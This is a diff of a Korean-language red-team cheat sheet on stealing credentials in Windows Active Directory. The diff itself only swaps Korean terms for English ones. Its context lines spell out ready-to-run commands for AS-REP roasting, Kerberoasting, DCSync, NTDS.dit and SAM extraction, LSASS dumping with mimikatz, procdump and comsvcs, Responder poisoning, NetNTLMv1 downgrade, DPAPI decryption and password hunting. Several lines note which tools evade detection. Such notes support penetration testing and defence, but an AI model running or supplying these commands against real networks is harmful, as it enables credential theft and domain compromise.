@@ -2,14 +2,14 @@
 
 레드팀 operation 의 연료. credential 이 넉넉해야 lateral movement 도, persistence 도, privilege escalation 도 편해진다.
 
-크게 세 갈래: Kerberos 프로토콜 자체의 약점을 파는 루트 (AS-REP Roast, Kerberoast, DCSync), 메모리·LSASS 덤프, 그리고 네트워크에서 hash 를 줍는 Poisoning / Relay.
+크게 세 갈래: Kerberos 프로토콜 자체의 약점을 파는 루트 (AS-REP Roast, Kerberoast, DCSync), 메모리·LSASS dump, 그리고 네트워크에서 hash 를 줍는 Poisoning / Relay.
 
 ---
 
 ## AS-REP Roasting
 
 Kerberos Pre-Authentication이 비활성화(DONT_REQUIRE_PREAUTH)된 계정을 대상으로 하는 공격.
-이 설정이 되어 있는 계정은 패스워드 없이 AS-REP를 요청할 수 있고, 응답에 포함된 해시를 오프라인 크래킹할 수 있다.
+이 설정이 되어 있는 계정은 password 없이 AS-REP를 요청할 수 있고, 응답에 포함된 hash를 오프라인 cracking할 수 있다.
 
 ```bash
 # Impacket - 사용자 목록으로 AS-REP Roasting
@@ -20,7 +20,7 @@ impacket-GetNPUsers <domain>/ -usersfile users.txt -format hashcat \
 nxc ldap <dc_ip> -u <user> -p <pass> --asreproast output.txt
 ```
 
-크래킹:
+cracking:
 ```bash
 hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
@@ -28,9 +28,9 @@ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 !!! warning "탐지"
     Event 4768 (Kerberos AS Request) 에서 Pre-Auth Type 0x0으로 기록된다. 대량 요청 시 이상 탐지 가능.
 
-SPN(Service Principal Name)이 설정된 서비스 계정의 TGS 티켓을 요청하여 오프라인 크래킹하는 공격.
+SPN(Service Principal Name)이 설정된 서비스 계정의 TGS 티켓을 요청하여 오프라인 cracking하는 공격.
 
-서비스 계정(SPN 설정된 계정)은 도메인 사용자의 유효한 TGT만 있으면 누구나 TGS를 요청할 수 있다. TGS는 서비스 계정의 NTLM 해시로 암호화되어 있으므로, 약한 패스워드를 사용하면 크래킹이 가능하다.
+서비스 계정(SPN 설정된 계정)은 도메인 사용자의 유효한 TGT만 있으면 누구나 TGS를 요청할 수 있다. TGS는 서비스 계정의 NTLM hash로 암호화되어 있으므로, 약한 password를 사용하면 cracking이 가능하다.
 
 ```bash
 # Impacket - Kerberoasting
@@ -41,7 +41,7 @@ impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> \
   -request-user <target_spn_user>
 ```
 
-크래킹:
+cracking:
 ```bash
 hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
@@ -49,7 +49,7 @@ hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
 !!! warning "탐지"
     Event 4769 (TGS Request) 에서 RC4 암호화(0x17) 요청이 기록된다. AES 요청으로 변경하면 이상 탐지를 줄일 수 있다.
 
-`Replicating Directory Changes` 및 `Replicating Directory Changes All` 권한이 있는 계정으로 도메인 컨트롤러의 NTDS.dit 데이터를 복제하는 공격. 도메인 내 모든 사용자의 NTLM 해시를 획득할 수 있다.
+`Replicating Directory Changes` 및 `Replicating Directory Changes All` 권한이 있는 계정으로 도메인 컨트롤러의 NTDS.dit 데이터를 복제하는 공격. 도메인 내 모든 사용자의 NTLM hash를 획득할 수 있다.
 
 ```bash
 # secretsdump - DCSync 공격
@@ -88,12 +88,12 @@ end backup
 # shadow copy에서 NTDS.dit 복사
 copy E:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
 
-# SYSTEM 레지스트리 하이브 (복호화에 필요)
+# SYSTEM Registry 하이브 (복호화에 필요)
 reg save HKLM\SYSTEM C:\Windows\Temp\system.bak
 ```
 
 ```bash
-# 추출한 파일에서 해시 덤프 (공격자 호스트)
+# 추출한 파일에서 hash dump (공격자 호스트)
 impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
 ```
 
@@ -103,12 +103,12 @@ impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
 
 ### Hashcat
 
-| 모드 | 해시 유형 | 용도 |
+| 모드 | hash 유형 | 용도 |
 |------|-----------|------|
-| 1000 | NTLM | Windows 패스워드 해시 |
+| 1000 | NTLM | Windows password hash |
 | 13100 | Kerberoast (TGS-REP etype 23) | Kerberoasting |
 | 18200 | AS-REP (etype 23) | AS-REP Roasting |
-| 5600 | NetNTLMv2 | Responder 캡처 해시 |
+| 5600 | NetNTLMv2 | Responder capture hash |
 | 3000 | LM | 레거시 |
 
 ```bash
@@ -118,7 +118,7 @@ hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
 # 규칙 기반 공격
 hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 
-# 특정 포맷: hashcat에 넣기 전에 해시 포맷을 확인할 것
+# 특정 포맷: hashcat에 넣기 전에 hash 포맷을 확인할 것
 # AS-REP: $krb5asrep$23$user@domain:...
 # TGS-REP: $krb5tgs$23$*user$domain$...
 ```
@@ -134,13 +134,13 @@ john --show hash.txt
 
 ## LLMNR/NBT-NS Poisoning
 
-네트워크에서 LLMNR(Link-Local Multicast Name Resolution) 및 NBT-NS 쿼리를 가로채 NetNTLMv2 해시를 캡처하는 기법.
+네트워크에서 LLMNR(Link-Local Multicast Name Resolution) 및 NBT-NS 쿼리를 가로채 NetNTLMv2 hash를 capture하는 기법.
 
 ```bash
 # Responder 실행
 responder -I <interface> -dwP
 
-# 캡처된 해시 크래킹
+# capture된 hash cracking
 hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -149,9 +149,9 @@ hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
 
 ---
 
-## LSASS 메모리 덤프
+## LSASS 메모리 dump
 
-로컬 관리자 권한으로 LSASS 프로세스에서 NTLM 해시, Kerberos 티켓, 평문 비밀번호를 추출한다.
+로컬 관리자 권한으로 LSASS 프로세스에서 NTLM hash, Kerberos 티켓, 평문 비밀번호를 추출한다.
 
 ```powershell
 # Mimikatz (가장 직접적이지만 탐지율 높음)
@@ -159,7 +159,7 @@ hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
 
 # procdump (SysInternals - 정상 도구이므로 탐지 우회 가능)
 procdump.exe -ma lsass.exe lsass.dmp
-# 로컬에서 해시 추출
+# 로컬에서 hash 추출
 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
 
 # comsvcs.dll (LOLBin - 추가 도구 불필요)
@@ -175,20 +175,20 @@ nanodump.exe --write C:\temp\lsass.dmp
 # pypykatz (Linux에서 dmp 파일 분석)
 pypykatz lsa minidump lsass.dmp
 
-# nxc로 원격 LSASS 덤프
+# nxc로 원격 LSASS dump
 nxc smb TARGET -u admin -p pass -M lsassy
 nxc smb TARGET -u admin -p pass -M nanodump
 nxc smb TARGET -u admin -p pass -M procdump
 ```
 
 !!! warning "Credential Guard"
-    Credential Guard가 활성화된 환경에서는 LSASS에서 NTLM 해시/평문 비밀번호를 추출할 수 없다. Kerberos 티켓만 일부 탈취 가능.
+    Credential Guard가 활성화된 환경에서는 LSASS에서 NTLM hash/평문 비밀번호를 추출할 수 없다. Kerberos 티켓만 일부 탈취 가능.
 
 ---
 
-## SAM Database 덤프
+## SAM Database dump
 
-로컬 계정의 NTLM 해시 추출. 로컬 관리자 권한 필요.
+로컬 계정의 NTLM hash 추출. 로컬 관리자 권한 필요.
 
 ```bash
 # nxc
@@ -197,11 +197,11 @@ nxc smb TARGET -u admin -p pass --sam
 # Impacket (원격)
 impacket-secretsdump admin:pass@TARGET --sam
 
-# 레지스트리에서 추출 (Windows에서)
+# Registry에서 추출 (Windows에서)
 reg save HKLM\SAM C:\temp\sam
 reg save HKLM\SYSTEM C:\temp\system
 reg save HKLM\SECURITY C:\temp\security
-# 로컬에서 파싱
+# 로컬에서 parsing
 impacket-secretsdump -sam sam -system system -security security LOCAL
 ```
 
@@ -249,7 +249,7 @@ dpapi::masterkey /in:MASTERKEY_FILE /sid:USER_SID /password:PASSWORD
 # 2. Credential 파일 복호화
 dpapi::cred /in:C:\Users\USER\AppData\Local\Microsoft\Credentials\CRED_FILE /masterkey:KEY
 
-# SharpDPAPI (비밀번호/NTLM 해시로 각종 DPAPI 보호 데이터 복호화)
+# SharpDPAPI (비밀번호/NTLM hash로 각종 DPAPI 보호 데이터 복호화)
 .\SharpDPAPI.exe credentials /password:pass
 .\SharpDPAPI.exe backupkey /file:key.pvk  # 도메인 DPAPI 백업키 (DC에서)
 ```
@@ -272,15 +272,15 @@ python3 firefox_decrypt.py ~/.mozilla/firefox/PROFILE/
 
 ## NetNTLMv1 다운그레이드
 
-NetNTLMv1 해시는 NetNTLMv2보다 크래킹이 훨씬 쉽다. Responder 설정으로 다운그레이드 유도 가능.
+NetNTLMv1 hash는 NetNTLMv2보다 cracking이 훨씬 쉽다. Responder 설정으로 다운그레이드 유도 가능.
 
 ```bash
 # Responder.conf에서 Challenge 고정
 # Challenge = 1122334455667788  (crack.sh 사용 시)
 
-# NTLMv1 해시를 NTLM으로 변환
+# NTLMv1 hash를 NTLM으로 변환
 # crack.sh 또는 rainbow table 사용
-# https://crack.sh (무료 NTLMv1 크래킹)
+# https://crack.sh (무료 NTLMv1 cracking)
 ```
 
 ---
@@ -290,7 +290,7 @@ NetNTLMv1 해시는 NetNTLMv2보다 크래킹이 훨씬 쉽다. Responder 설정
 ### Windows
 
 ```powershell
-# 파일 내 패스워드 검색
+# 파일 내 password 검색
 findstr /si password *.txt *.xml *.ini *.config *.ps1
 
 # PowerShell 히스토리
@@ -306,11 +306,11 @@ type C:\inetpub\wwwroot\web.config
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 
 # DPAPI 보호 credential
-# Chrome, Edge 등의 브라우저 저장 패스워드
+# Chrome, Edge 등의 브라우저 저장 password
 # Windows Credential Manager
 cmdkey /list
 
-# 레지스트리에 저장된 autologon
+# Registry에 저장된 autologon
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
 
